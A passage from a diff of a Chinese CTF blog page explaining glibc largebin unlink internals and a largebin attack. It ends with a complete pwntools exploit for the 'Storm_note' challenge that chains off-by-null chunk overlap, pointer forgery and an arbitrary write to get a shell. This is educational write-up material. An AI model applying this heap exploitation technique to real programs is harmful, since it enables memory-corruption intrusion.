unlink(victim, bck, fwd);   <span class="comment">// 将这个堆块从 largebin 卸下</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Exhaust */</span></span><br><span class="line">  <span class="keyword">if</span> (remainder_size &lt; MINSIZE)  &#123;    <span class="comment">// 如果切割后剩下的堆块大小 小于最小的堆块(16 or 32) 这个堆块会直接返回给用户，例如 64 位系统，切割剩余的大小为 16，那么用户拿到的堆块中有16 个字节是多出来的(或者说是浪费掉的)</span></span><br><span class="line">    set_inuse_bit_at_offset(victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Split */</span></span><br><span class="line">  <span class="keyword">else</span> &#123;     <span class="comment">// 如果切割剩余的堆块大小大于 MINSIZE</span></span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">       have to perform a complete insert here.  */</span></span><br><span class="line">    bck = unsorted_chunks(av);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (fwd-&gt;bk != bck, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    remainder-&gt;bk = bck;</span><br><span class="line">    remainder-&gt;fd = fwd;</span><br><span class="line">    bck-&gt;fd = remainder;</span><br><span class="line">    fwd-&gt;bk = remainder;    <span class="comment">// 将切割剩余的部分插入到 unsortedbin 中</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;  <span class="comment">// 如果剩下的大小是 largebin，清除它的 fd_nextsize、bk_nextsize 指针(因为它们在 uunsortedbin 中无用)</span></span><br><span class="line">      &#125;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot(remainder, remainder_size);</span><br><span class="line">  &#125;</span><br><span class="line">  check_malloced_chunk(av, victim, nb);</span><br><span class="line">  <span class="keyword">void</span> *p = chunk2mem(victim);   <span class="comment">// 返回堆块</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中最为重要的就是 unlink 宏，定义如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line">  FD = P-&gt;fd;                                                          \</span><br><span class="line">  BK = P-&gt;bk;                                                          \</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                \</span><br><span class="line">    malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P); \</span><br><span class="line">  <span class="keyword">else</span> &#123;                                                               \</span><br><span class="line">    FD-&gt;bk = BK;                                                       \</span><br><span class="line">    BK-&gt;fd = FD;                                                       \</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				       \</span><br><span class="line">	&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;	       \</span><br><span class="line">      assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);		       \</span><br><span class="line">      assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);		       \</span><br><span class="line">      <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				       \</span><br><span class="line">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       \</span><br><span class="line">	  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       \</span><br><span class="line">	<span class="keyword">else</span> &#123;							       \</span><br><span class="line">	  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       \</span><br><span class="line">	  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       \</span><br><span class="line">	  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       \</span><br><span class="line">	  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       \</span><br><span class="line">	&#125;							       \</span><br><span class="line">      &#125;	<span class="keyword">else</span> &#123;							       \</span><br><span class="line">	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       \</span><br><span class="line">	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       \</span><br><span class="line">      &#125;								       \</span><br><span class="line">    &#125;								       \</span><br><span class="line">  &#125;                                                                    \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>unlink 对于普通堆块和 largebin 堆块有不同的操作，原因是 largebin 的结构比较特殊，为了提高堆块分配的效率，需要针对 largebin 进行优化。</p>
+<p>当 unlink 一个 largebin chunk 的时候，首先判断 chunk 是否属于 largebin，并且需要满足 P-&gt;fd_nextsize-&gt;bk_nextsize == P ，P-&gt;bk_nextsize-&gt;fd_nextsize == P，这些判断条件与 unlink 一个正常堆块类似。接下来分成三种情况。</p>
+<p>情况一：largebin 中只存在一组纵向链表，要 unlink 链表的首节点。</p>
+<p>对应代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				       \</span><br><span class="line">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       \</span><br><span class="line">	  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       \</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/229018/1554990433352-6d83795f-89af-4ee4-879c-d4175d4d1512.png#align=left&display=inline&height=302&name=2.png&originHeight=302&originWidth=624&size=8599&status=done&width=624" alt="2.png"></p>
+<p>情况二： largebin 中存在多组不同大小的纵向链表，要 unlink 其中一个纵向链表的首节点。</p>
+<p>对应代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;							       \</span><br><span class="line">	  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       \</span><br><span class="line">	  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       \</span><br><span class="line">	  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       \</span><br><span class="line">	  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       \</span><br><span class="line">	&#125;							       \</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/229018/1554990439900-d559a00c-0099-4b53-9ea3-936e10031bf0.png#align=left&display=inline&height=595&name=3.png&originHeight=595&originWidth=658&size=13304&status=done&width=658" alt="3.png"></p>
+<p>情况三：有多组不同大小的纵向链表，要 unlink 其中一个链表的首节点，但是这个链表只有一个 chunk。</p>
+<p>对应代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;							       \</span><br><span class="line">	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       \</span><br><span class="line">	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       \</span><br><span class="line">      &#125;								       \</span><br></pre></td></tr></table></figure>
+
+<p>这个比较简单，就不画图了。</p>
+<p>从上面的例子来看，当从 largebin 中分配堆块的时候，首先要找到合适大小的纵向链表，由于每一条纵向链表的 chunk 大小都是相同的，所以只需取第一个 chunk 即可。当取出这个 chunk 的时候根据当前纵向链表情况不同有三种不同的处理办法，但实际上它们的原理是相同的，如果纵向链表有多个 chunk，那么直接将第二个 chunk 提前到横向链表中即可，如果没有多余的 chunk，就将这个纵向链表从横向链表中去除。</p>
+<p>由于 unlink 的过程中会对 chunk 的 fd_nextsize 以及 bk_nextsize 进行读写，如果能够控制这些指针，就能构造类似 unlink 的效果，在任意地址写入堆的地址。</p>
+<h2 id="漏洞利用思路分析"><a href="#漏洞利用思路分析" class="headerlink" title="漏洞利用思路分析"></a>漏洞利用思路分析</h2><p>构造两个 overlap largebin chunk，一个较大，一个较小，但是两个 chunk 的 size 要位于同一个 index 范围内。</p>
+<p>先将较小的 chunk free，放在 largebin 中(单执行 free 操作 chunk 会进入到 unsortedbin 中，还需要再做一个 malloc 才能将不合适的 chunk 放在对应的链表中，具体可以参考 ptmalloc 的源代码)，此时，我们可以通过 overlap 修改这个 chunk 中的各种指针。然后将较大的 chunk free ，这个 chunk 会进入 unsortedbin，并且也能通过 overlap 修改其中的指针。</p>
+<p>目的是伪造一种合法的条件，当较大的 chunk 从 unsortedbin 中取出插入 largebin 的过程中，会执行一系列指针操作，通过这些操作我们可以在 mmap 的区域写入 heap 的地址，由于 heap 地址最高字节比较固定(通常为 0x56 或 0x55 )，所以利用错位的技巧就能伪造出一个“合法的 size”，注意我们是利用 unsorted bin 插入 largebin 来实现任意地址写的，此时 unsorted bin 的 bk 指针已经被改写为 mmap 区域的地址，当触发 largebin attack 改写 mmap 区域地址之后， 就相当于将 mmap 区域链接到了 unsortedbin 中，在 ptmalloc 内部代码中会验证这块内存是否合法，由于必要参数已经提前伪造，所以可以将 mmap 这块内存返回给我们控制，进而修改随机数 getshell。</p>
+<p>我借用梅子酒公众号上的 wp 来进行说明，首先封装一些函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./Storm_note'</span>)</span><br><span class="line"><span class="comment">#p=remote('ctf1.linkedbyx.com',10444)</span></span><br><span class="line"><span class="comment">#port:10444</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'1'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,mes)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'2'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(idx))</span><br><span class="line">  p.recvuntil(<span class="string">'Content'</span>)</span><br><span class="line">  p.send(mes)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'3'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(idx))</span><br></pre></td></tr></table></figure>
+
+<p>第一步是构造 overlap 的 chunk，初始状态分配了下面这些堆块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'h'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">'h'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br></pre></td></tr></table></figure>
+
+<p>然后将 chunk1 删除，做 off-by-null，构造 overlap 的 largebin chunk。如法炮制，再构造另一个 overlap 的 largebin chunk。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'h'</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)         <span class="comment"># 后向合并,构造第一个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">'h'</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)         <span class="comment"># 后向合并,构造第二个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br></pre></td></tr></table></figure>
+
+<p>overlap 的 chunk:</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/229018/1554990451787-b7d8bfd2-e45a-41f7-b5b1-e6612082b9a7.jpeg#align=left&display=inline&height=1031&name=5.jpg&originHeight=1031&originWidth=513&size=59621&status=done&width=513" alt="5.jpg"></p>
+<p>我们将两个 overlap 的 chunk 进行 free，unsortedbin 中呈现以下结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">较小的 chunk -&gt; 较大的 chunk</span><br></pre></td></tr></table></figure>
+
+<p>然后通过 add(0x4e8) 将较大的 chunk 拿回来，那么小的那个就会进入 largebin。</p>
+<p>再 delete 刚刚拿回来的 chunk，那么链表呈现以下结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">largebin： 较小的 chunk</span><br><span class="line">unsortedbin： 较大的 chunk</span><br></pre></td></tr></table></figure>
+
+<p>此时通过 overlap 分别编辑位于 unsortedbin 和 largebin 中的 chunk 的指针，构造 largebin attack 的条件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">storage = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">edit(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)   <span class="comment">#bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks</span></span><br><span class="line">edit(<span class="number">8</span>, p2)</span><br></pre></td></tr></table></figure>
+
+<p>以上操作完成之后，再执行 add(0x48) 这个操作，ptmalloc 会先去 unsortedbin 寻找合适的 chunk，但是并不能找到，并且当前存在于 unsorted bin 中的 chunk 也不是 last_remainder 不会切割。于是会将这个 chunk 先插入到 largebin 中，由于我们已经修改了其中的指针，所以在插入 chunk 的过程中就会在目标区域写入 heap 的地址，利用错位即可构造出合适的 size。</p>
+<p>malloc 在循环一圈之后回到循环起点，再次判断 bk 是否为空，但是 bk 此时已经指向了目标区域，这是由于插入 largebin 的过程中会先将 chunk 从 unsorted bin unlink，执行以下操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure>
+
+<p>其中 bck = victim -&gt; bk</p>
+<p>那么 unsorted_chunks(av)-&gt;bk = victim -&gt; bk = target</p>
+<p>所以当再次循环到起点时，ptmalloc 检测到 bk 不为空，并且它指向的 chunk(target) 的 size 还正好和分配的 size 精确相等，所以直接将 chunk 取出，这里取出的就是 target，然后修改随机数 + 利用 backdoor 函数即可 getshell！</p>
+<h2 id="完整-EXP"><a href="#完整-EXP" class="headerlink" title="完整 EXP"></a>完整 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./Storm_note'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'1'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,mes)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'2'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(idx))</span><br><span class="line">  p.recvuntil(<span class="string">'Content'</span>)</span><br><span class="line">  p.send(mes)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'3'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'h'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">'h'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'h'</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)         <span class="comment"># 后向合并,构造第一个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">'h'</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)         <span class="comment"># 后向合并,构造第二个 overlap largebin chunk</span></span><br><span class="line">add(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">storage = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">edit(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)   <span class="comment">#bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks</span></span><br><span class="line">edit(<span class="number">8</span>, p2)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'666'</span>)</span><br><span class="line">p.send(<span class="string">'\x00'</span>*<span class="number">0x30</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>Buy me a cup of coffee~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/z.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/w.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/06/21/angr-sctf-babymips/" class="archive-article-date">
-  	<time datetime="2018-06-20T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/06/21/angr-sctf-babymips/">符号执行实例–SCTF2018 babymips</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/angr//" class="article-tag-list-link color5">angr</a>
-        		</li>
-      		
-		</ul>
-	</div>
+      
 
-
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
